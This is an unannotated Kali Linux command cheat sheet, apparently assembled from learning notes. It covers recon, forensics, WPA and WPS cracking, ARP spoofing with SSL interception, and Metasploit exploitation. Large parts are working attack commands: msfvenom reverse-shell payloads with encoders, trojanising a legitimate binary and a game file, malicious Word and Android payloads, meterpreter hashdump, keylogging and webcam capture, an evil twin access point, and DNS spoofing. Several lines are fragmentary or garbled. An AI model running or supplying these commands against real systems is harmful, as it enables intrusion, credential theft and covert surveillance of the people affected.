



https://github.com/aboul3la/Sublist3r#examples
## ----------------------------------------------------------------------------------- ##
##  [?] 
## ----------------------------------------------------------------------------------- ##
##  [?] 


## ----------------------------------------------------------------------------------- ##
##  [?] 
## ----------------------------------------------------------------------------------- ##
https://github.com/Keybird0/Kali-learning-notes/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E
https://github.com/Keybird0/Kali-learning-notes/wiki/%E4%BD%BF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7





theharvester -d microsoft.com -l 500 -b google -h myresults.html
theharvester -d microsoft.com -b pgp
theharvester -d microsoft -l 200 -b linkedin
theharvester -d apple.com -b googleCSE -l 500 -s 300

theharvester -d sina.com -l 300 -b google -f sina.html




metagoofil -d apple.com -t doc,pdf -l 200 -n 50 -o applefiles -f results.html
metagoofil -h yes -o applefiles -f results.html (local dir analysis)
metagoofil -d sina.com -t pdf -l 200 -o test -f 1.html



show option

USER-AGENT
Proxy
Workspace
Snapshot

show schema


query select * from hosts where host like '%example.com%' order by ip_address
set SOURCE query select host from hosts where host like '%sina.com.cn%'



search google

Recon
    recon/domains-hosts/google_site_api
    recon/domains-hosts/google_site_web
use recon/domains-hosts/google_site_web
show option
show info

set SOURCE sina.com
run

search report
use reporting/html
show option
set FILENAME  /root/Desktop/example.html
run











##-================-##
##  [+] Autopsy
##-================-##


##-=========================================-##
##  [+] DFF（Digital Forensics Framework）
##-=========================================-##
extundelete [device-file] --restore-file [restore location]



foremost -t jpeg,gif,png,doc -i xp.raw
foremost xx.cap



binwalk xx.raw -e


## ----------------------------------------------------------------------------------- ##
##  [?] 
## ----------------------------------------------------------------------------------- ##
https://github.com/Keybird0/Kali-learning-notes/wiki/%E6%B4%BB%E5%8F%96%E8%AF%81


##-============================-##
##  [+] Suggested Profile(s)
##-============================-##
volatility -f xp.raw imageinfo


volatility -f xp.raw --profile=WinXPSP3x86 memdump -p < pid > -D test


volatility -f xp.raw --profile=WinXPSP3x86 timeliner


## ----------------------------------------------------------------------------------- ##
##  [?] 
## ----------------------------------------------------------------------------------- ##
https://github.com/sans-dfir/sift-files/tree/master/volatility


## ----------------------------------------------------------------------------------- ##
##  [?] 
## ----------------------------------------------------------------------------------- ##
https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples


## ----------------------------------------------------------------------------------- ##
##  [?] 

## ----------------------------------------------------------------------------------- ##

https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py

volatility -f xp.raw --profile=WinXPSP3x86 mimikatz




##-=============================-##
##  [+] list harmful metadata
##-=============================-##
mat2 --verbose --show images/*/*



##-============================-##
##  [+] 
##-============================-##
--lightweight     remove SOME metadata











URL="http://www.google.com";curl -L --w "$URL\nDNS %{time_namelookup}s conn %{time_connect}s time %{time_total}s\nSpeed %{speed_download}bps Size %{size_download}bytes\n" -o/dev/null -s $URL




a function to find the fastest free DNS server

timeDNS() { parallel -j0 --tag dig @{} "$*" ::: 208.67.222.222 208.67.220.220 198.153.192.1 198.153.194.1 156.154.70.1 156.154.71.1 8.8.8.8 8.8.4.4 | grep Query | sort -nk5; }





$echo "\n\n>>>>> Accounts ------"
$echo "Number of accounts `wc -l /etc/passwd`"

$echo "\nAccounts with UID=0: " 
$echo `awk -F: '{if ($3=="0") print $1}' /etc/passwd`

for f in `whereis named| awk -F: '{print $2}'` ; do ls -l $f;  done;
for f in `whereis postfix| awk -F: '{print $2}'` ; do ls -ld $f;  done;


service --status-all |grep "+"
systemctl is-enabled tmp.mount 2> /dev/null | grep -E 'disabled' |wc -l
systemctl is-enabled autofs 2> /dev/null | grep -E 'disabled' | wc -l

systemctl is-enabled firewalld | grep enabled | wc -l
firewall-cmd --state | grep running | wc -l
firewall-cmd --get-default-zone
nft list
nft list ruleset
iptables -L | grep -E 'INPUT (policy DROP)'
iptables -L | grep -E 'FORWARD (policy DROP)'
iptables -L | grep -E 'OUTPUT (policy DROP)'
iptables -L INPUT -v -n | grep ":$i" | grep ACCEPT



systemctl is-enabled $serv 2> /dev/null | grep disabled | wc -l
systemctl status $serv 2>/dev/null | grep dead | wc -l




grep -e ^\s*Storage /etc/systemd/journald.conf




mount | grep -E '\s/tmp\s')" =~ ".*tmpfs\s\(rw.*nosuid.*nodev.*noexec.*relatime\)

mount -o loop kali.iso /media/cdrom



##-===================================-##
##  [+] List All Packages Installed

apt-cache pkgnames

##-=================================-##
##  [+] Check Upgradable Packages

apt list --upgradeable

/etc/apt/apt.conf
   Acquire::ftp::Proxy "ftp://127.0.0.1:8087/";
   Acquire::http::Proxy "http://127.0.0.1:8087/";
   Acquire::https::Proxy "http://127.0.0.1:8087/";
   Acquire::socks::Proxy "http://127.0.0.1:8087/";


/etc/bash.bashrc
export ftp_proxy="ftp://user:password@proxyIP:port"
export http_proxy="ftp://user:password@proxyIP:port"
export https_proxy="ftp://user:password@proxyIP:port"
export socks_proxy="ftp://user:password@proxyIP:port"
export socks_proxy="ftp://127.0.0.1:1080"

socks5 	127.0.0.1 1080



detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)



find / -iname nmap
find . -name "ps*" -exec cp {} /tmp/{}.bak


crontab='crontab -l root';
lsof='lsof -i -C';
proc1="ps -e | awk '{print $4}' ";   # get process name, commandline
ps a | awk '{print $1}' | grep $pid


netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2
netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2



netstat -pantu | egrep -v '0.0.0.0|::::'
netstat -pantu | egrep -v '0.0.0.0|::::'| awk '{print $5}'
netstat -pantu | egrep -v '0.0.0.0|::::'| awk '{print $5}'| egrep -v 'and|address'
netstat -pantu | egrep -v '0.0.0.0|::::'| awk '{print $5}'| egrep -v 'and|address' | cut -d ':' -f 1 | sort | uniq >> ip

netstat -nr



ss -lntu | grep -E ':25\s' | grep -E -v '\s(127.0.0.1|::1):25\s'
ss -4tuln | awk  '{print $5}' | awk -F ':' '{print $2}' | awk NR




sysctl -w net.ipv4.ip_forward=1
echo 1 > /proc/sys/ipv4/ip_forward



grep -E -s "^\s*net\.ipv4\.$query\s*=\s*1" /etc/sysctl.conf /etc/sysctl.d/*.conf /usr/lib/sysctl.d/*


##-=====================-##
##  [+] Disable IPv6
##-=====================-##
echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.d/disableipv6.conf


##-=====================-##
##  [+] 
##-=====================-##
sed 's/quiet/quiet nouveau.modeset=0/g' -i /etc/default/grub
update-grub






##-=====================-##
##  [+] 
##-=====================-##
dhclient eth0
ifconfig eth0 192.168.1.10/24
route add default gw 192.168.1.1
route add -net 172.16.0.0/24 gw 192.168.1.100 eth0



##-=====================-##
##  [+] 
##-=====================-##
auto eth0
iface eth0 inet static
address 192.168.0.3
netmask 255.255.255.0
gateway 192.168.0.254
dns-nameservers 


##-=====================-##
##  [+] 
##-=====================-##
nmcli radio all | awk '{print $2}' | grep disabled | wc -l



/sys/class/net/$1/
iwconfig $iface | grep ESSID
wlancfg show $iface
wlanctl-ng $iface lnxreq_ifstate ifstate=enable 
wlanctl-ng $iface lnxreq_wlansniff enable=false  >/dev/null
wlanctl-ng $iface lnxreq_ifstate ifstate=disable


Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`


echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]
iwconfig 2>&1 | grep Monitor | awk '{print $1}'

 | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1
 | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'


 |grep "-" | cut -d- -f1)
 | grep -v "on interface" | awk '{ print $2 }'
 | awk '{print($(NF-2))}'


pyrit -r $File analyze

Host_SSID_loc=$(pyrit -r $File analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
Host_MAC_loc=$(pyrit -r $File analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')

Host_SSID_loc=$(timeout -s SIGKILL 3 aircrack-ng $File | grep WPA | grep '1 handshake' | awk '{print $3}')
Host_MAC_loc=$(timeout -s SIGKILL 3 aircrack-ng $File | grep WPA | grep '1 handshake' | awk '{print $2}')

pyrit -r $File analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
                                    
echo $i | cut -d " " -f1) $yellow$(echo $i | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')$transparent ($green $(echo $i | cut -d "(" -f2 | cut -d "'" -f2

 | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`


wpaclean $File/$Host_SSID-$Host_MAC.cap $Dir/$Host_MAC-01.cap


pyrit -r $Dir/$Host_MAC-01.cap -o $Dir/$File.cap stripLive
pyrit -r $Dir/$File.cap -o $File/$Host_SSID-$Host_MAC.cap strip
aircrack-ng $Dir/$Host_MAC-01.cap | grep -q "1 handshake"
aircrack-ng --bssid $BSSID -w- $Dir/$File
hashcat -m 2500 -a 3 $Dir/$File.hccap $MASK

bully -b $BSSID -c $channel $WIFI_MONITOR1 | tee $File.txt
bully -b $BSSID -c $channel $WIFI_MONITOR1
bully -b $BSSID -c $channel $WIFI_MONITOR1
reaver -i $WIFI_MONITOR1 -b $BSSID -c $channel -vv
reaver -i $WIFI_MONITOR1 -b $BSSID -c $channel -vv 



airodump-ng -i wlan0mon --wps
reaver -i wlan0mon -b $APMAC -vv -c 11 
reaver -i wlan0mon -b $APMAC -vv -K 1
pixiewps -e <pke> -r <pkr> -s <e-hash1> -z <e-hash2> -a <authkey> -n <e-nonce>







## ----------------------------------------------------------------------------------- ##
##  [?] https://github.com/Keybird0/Kali-learning-notes/wiki/WPA%E7%A0%B4%E8%A7%A3
## ----------------------------------------------------------------------------------- ##

airmon-ng start wlan0

airodump-ng wlan0mon
## airodump-ng --bssid <AP BSSID> -c 11 -w wpa wlan0mon
airodump-ng --bssid $BSSID -c 11 -w wpa wlan0mon
airodump-ng --bssid $APBSSID -c 11 -w wpa wlan0mon


aireplay-ng -0 2 -a <AP BSSID> -c $StationMAC wlan0mon
aireplay-ng -0 2 -a $BSSID -c $StationMAC wlan0mon
aircrack-ng -w /usr/share/john/password.lst $File.cap


airbase-ng --essid $ESSID -c 11 wlan0mon
airbase-ng --essid $ESSID -c 11 wlan0mon -0



service network-manager stop
airmon-ng check kill 




hostapd-wpe hostapd-wpe.conf 




pyrit -i $File.lst import_passwords


pyrit -r $File.cap -i $File.lst -b 24:da:9b:7b:81:36  attack_passthrough






echo $ESSID > $File.txt 

airolib-ng db --import essid essid.txt

airolib-ng --import passwd /usr/share/john/password.lst
airolib-ng db --stats

airolib-ng db --batch
airolib-ng db --stats

aircrack-ng -r db $File.cap







##-================-##
##    [+] WEP
##-================-##
airdecap-ng -w <$File -b $BSSID  $File.pcap


##-================-##
##    [+] WPA
##-================-##
airdecap-ng -p <pass> -b $BSSID -e $ESSID  $File.pcap











##-===================-##
##  [+] AIRSERV-NG 
##-===================-##
airmon-ng start wlan0
airserv-ng -p 3333 -d wlan0mon
airodump-ng < remote_ip >:3333




##-==================-##
##  [+] AIRTUN-NG 
##-==================-##


##-============-##
##  [+] WEP
##-============-##
airtun-ng -a <AP MAC> -w $File> wlan0mon

##-===========-##
## [+] WPA
##-===========-##
airtun-ng -a <AP MAC> -p <PSK> -e <ESSID> wlan0mon



ifconfig at0 up


airodump-ng wlan0mon --bssid <bssid> -c 6 -w $File
tcpreplay -ieth0 -M1000 $File.cap  | snort
driftnet -i at0
dsniff -i at0



airtun-ng -a <AP MAC> -p <PSK> -e <ESSID> wlan0mon -w $File

ifconfig at1 up
airodump -c 1,11 wlan0mon




##-=================-##
## [+] Repeate
## [+] WDS/Bridge
##-=================-##

airtun-ng -a <AP MAC> --repeat --bssid <AP MAC> -i wlan0mon wlan2mon

wlan0mon
wlan2mon


##-==============-##
## [+] Replay
##-==============-##
airtun-ng -a <Source AP MAC> -r $File.cap <interface>






gpsd -n -N C4 /dev/ttyUSB0


Kismet-*.alert
Kismet-*.gpsxml  #gps
Kismet-*.nettxt
Kismet-*.netxml
Kismet-*.pcapdump


##-===========-##
## [+] GPS
##-===========-##
giskimet -x Kismet-20151126-18-42-55-1.netxml

##-====================-##
## [+] Google earth
##-====================-##
giskismet -q "select * from wireless" -o ask.kml


















strings $Dir/$File.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1

dhcpd -d -f -lf /$Dir/dhcpd.leases -cf /$Dir/dhcpd.conf $interfaceroutear 2>&1 | tee -a /$Dir/$File.txt



"Create Self-Signed SSL Certificate" -e 

openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /root/server.pem -out /root/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html



## ----------------------------------------------------------------------------------- ##
##  [?] 
## ----------------------------------------------------------------------------------- ##

Numeric: [0-9]
Alpha: [a-z]
Upper Alpha: [A-Z]
Alpha Numeric: [0-9][a-z]
Upper Alpha Numeric: [0-9][A-Z]
Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]



 | egrep 'rt2800|rt73'
 | grep -E '(0640||0600)'





#!/bin/bash
for n in `seq 254`
do
    ping 192.168.0.$n -c 1 | grep ttl | awk '{print $4}' | awk -F : '{print $1}'
done
 
 
 
 
 

## ----------------------------------------------------------------------------------- ##
##  [?] git clone https://github.com/letsencrypt/letsencrypt
## ----------------------------------------------------------------------------------- ##
letsencrypt-auto certonly --standalone -d $site --email $admin_email --renew-by-default
letsencrypt-auto renew















openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 999 -key ca.key -out ca.crt


arpspoof -i eth0 -t 192.168.0.108 -r 192.168.0.1

sslsplit -D -l connect.log -j /root/test -S /root/test/log -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080



iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

mitmproxy -T --host -w -p 8080 $File.log

sslstrip -l 8080 -w $File.txt

thc-ssl-dos ip 443 --accept



dnsdict6 -4 -d -t 16 -e -x sina.com




dnsenum -f /usr/share/dnsenum/dns.txt -dnsserver 8.8.8.8 sina.com -o $File.xml


dnsmap target-domain.foo
dnsmap target-domain.foo -w yourwordlist.txt -r /tmp/$File.txt
dnsmap target-fomain.foo -r /tmp/ -d 3000
dnsmap target-fomain.foo -r ./$File.txt


dnsmap  -w wordlist.txt sina.com



dnsrecon -d sina.com --lifetime 10 -t brt -D usr/share/dnsrecon/namelist.txt -x $File.xml





iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPS 
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPS 
iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3S 

iptables 
 -p tcp --dport 465     ## SMTPS 
 -p tcp --dport 993     ## IMAPS
 -p tcp --dport 995     ## POP3S
 
 
 
 
openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.baidu.com:443




sslscan --tlsall www.baidu.com:443
sslscan --show-certificate --no-ciphersuites www.baidu.com

sslyze --regular www.baidu.com:443


nmap --script=ssl-enum-ciphers.nse www.baidu.com



nmap -sT -iL iplist.txt -p 80



dmitry -b ip
dmitry -p 172.16.36.135

dmitry -p 172.16.36.135 -o $File


amap -B 172.16.36.135 1-65535 | grep on 
amap 192.168.0.130 1-100 -q
amap 192.168.0.130 1-100 -qb


hping3 1.1.1.1 --scan  80 -S
hping3 1.1.1.1 --scan 1-100 -S
hping3 1.1.1.1 --scan 80,21,22 -S
hping3 -c 10 --spoof 1.1.1.2 -p ++1 1.1.1.3 


tcpdump -i eth0 -s 0 -w $File.pcap
tcpdump -i eth0 port 22
tcpdump -i eth0 tcp port 22

tcpdump -i eth0 -s 0 -w $File.cap
tcpdump -A -r $File.cap
tcpdump -X -r $File.cap

tcpdump -n -r $File.cap | awk '{print $3}'| sort -u
tcpdump -n src host 145.254.160.237 -r $File.cap
tcpdump -n dst host 145.254.160.237 -r $File.cap
tcpdump -n port 53 -r $File.cap
tcpdump -nX port 80 -r $File.cap


tcpdump -n -r $File.cap | awk '{print $3}'| sort -u


tcpdump -A -n 'tcp[13]=24' -r $File.cap




iptables -A OUTPUT -p tcp --tcp-flags RST RST -d localhost -j DROP




nmap -v -p139,445 192.168.60.1-20
nmap 192.168.60.4 -p139,445 --script=smb-os-discovery.nse
ls /usr/share/nmap/scripts/ | grep smb
nmap -v 192.168.0.157 -p 139,445 --script=smb-vuln-ms08-067.nse --script-args=unsafe




nbtscan -r 1.1.1.1
nbtscan -v -s : 192.168.0.1/24
enum4linux -a 192.168.60.10





onesixtyone 1.1.1.1 public

onesixtyone -c $File.txt -i hosts -o $File.log -w 100
snmpwalk -c public -v 2c 1.1.1.1 1.3.6.1.4.1.77.1.2.25



snmpwalk 192.168.20.199 -c public -v 2c

snmp-check  192.168.0.157

lbd www.baidu.com


wafw00f -l 
wafw00f http://www.microsoft.com
nmap www.microsoft.com --script=http-waf-detect.nse




msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/ reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit"





hosts -c address,os_flavor -S Linux
services -p 80
services -c info,name -p 1-1000
sessions -i id 




db_import /root/nmap.xml
db_export -f xml /root/$File.xml
db_connect -y /usr/share/metasploit-framework/config/database.yml


##-=================-##
## [+] resource
##-=================-##
msfconsole -r xx.rc



load openvas
db_import openvas.nbe




##-=========================================-##
## [+] Greenbone Security Sssistant (GSA)
##-=========================================-##

##-======================-##
## [+] OpenVAS Manager
##-======================-##

##-=======================-##
## [+] OpenVAS Scanner
##-=======================-##

##-==================-##
## [+] OpenVAS CU
##-==================-##

##-===================-##
## [+] OSP Scanner
##-===================-##
openvas-check-setup

openvasmd --get-users
openvasmd --user=admin --new-password=password

openvas-feed-update

/usr/bin/openvas-start


##-================================-##
## [+] Starting OpenVas Services      
##-================================-##

##-=========================================-##
## [+] Starting OpenVas Manager:openvasmd      
##-=========================================-##

##-=========================================-##
## [+] Starting OpenVas Scanner:openvassd       
##-=========================================-##

##-==================================================-##
## [+] Starting Greenbone Security Assistant:gsad  
##-==================================================-##

openvas-start
https://127.0.0.1:9392





##-=================-##
##  [+] 
##-=================-##

## ----------------- ##
##  [?] 
## ----------------- ##
https://www.tenable.com/downloads/nessus
dpkg -i deb
service nessusd start
https://localhost:8834


##-=================-##
##  [+] 
##-=================-##
load nessus
nessus_help
nessus_connect admin:toor@1.1.1.1
nessus_policy_list
nessus_scan_new
nessus_report_list



## [+] NEXPOSE
##-=================-##
##  [+] 
##-=================-##

http://download2.rapid7.com/download/NeXpose-v4/NexposeVA.ova
## ----------------- ##
##  [?] 
## ----------------- ##

http://IP_addr:3780  
(nxadmin / nxpassword)

http://www.rapid7.com/products/nexpose/virtual-appliance-enterpirse.jsp 
## ----------------- ##
##  [?] 
## ----------------- ##







##-=================-##
##  [+] 
##-=================-##
upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
execute -f cmd.exe -i -H
getuid
getsystem
getprivs
getproxy
getpid
Hashdump
run post/windows/gather/hashdump
sysinfo
ps
kill
migrate
reboot
shutdown
shell
show_mount
search -f autoexec.bat
arp
netstat
ipconfig
ifconfig
route
Idletime
resource
record_mic
webcam_list 
webcam_snap





use exploit/windows/smb/psexec
set RHOST 192.168.1.100
set PAYLOAD windows/shell/reverse_tcp - set LHOST 192.168.1.1
set LPORT 4444
set SMBUSER user1
set SMBPASS pass1
exploit


use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
set URIPATH /
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
exploit


use payload/windows/shell_bind_tcp
generate
generate -b '\x00'
generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'




show encoders
generate -e x86/nonalpha

generate -b '\x00' -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/ share/windows-binaries/radmin.exe -f /root/1.exe

generate -s 14





##-=================-##
##  [+] Windows
##-=================-##
msfvenom --payload-options -p windows/shell/reverse_tcp
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -f exe -o 1.exe
msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 1.1.1.1
set LPORT 4444
exploit


msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b "\x00" -f elf -o /root/free/usr/games/ freesweep_scores




##-================-##
##  [+] Android
##-================-##
use payload/android/meterpreter/reverse_tcp
generate -f a.apk -p android -t raw



##-============-##
##  [+] PDF
##-============-##
exploit/windows/fileformat/adobe_utilprintf
exploit/windows/browser/adobe_utilprintf
meterpreter

use priv
run post/windows/capture/keylog_recorder


##-=============-##
##  [+] Word
##-=============-##
msfvenom -a x86 --platform windows -p windows/ meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
run


##-==============-##
##  [+] Flash
##-==============-##
use exploit/multi/browser/adobe_flash_hacking_team_uaf
use exploit/multi/browser/adobe_flash_opaque_background_uaf
use auxiliary/server/browser_autopwn2




##-====================-##
##  [+] EVIL TWIN AP
##-====================-##
airmon-ng start wlan0
airbase-ng -a <AP mac> --essid "kifi" -c 11 wlan0mon
brctl addbr Wifi-Bridge   
brctl addif Wifi-Bridge eth0  

brctl addif Wifi-Bridge at0          
ifconfig eth0 0.0.0.0 up             
ifconfig at0 0.0.0.0 up     
ifconfig Wifi-Bridge 192.168.1.10 up
route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1

ifconfig
netstat -ar

echo 1 > /proc/sys/net/ipv4/ip_forward


dnspoof -i Wifi-Bridge -f dnsspoof.hosts

hosts
127.0.1.1	*.kali.com










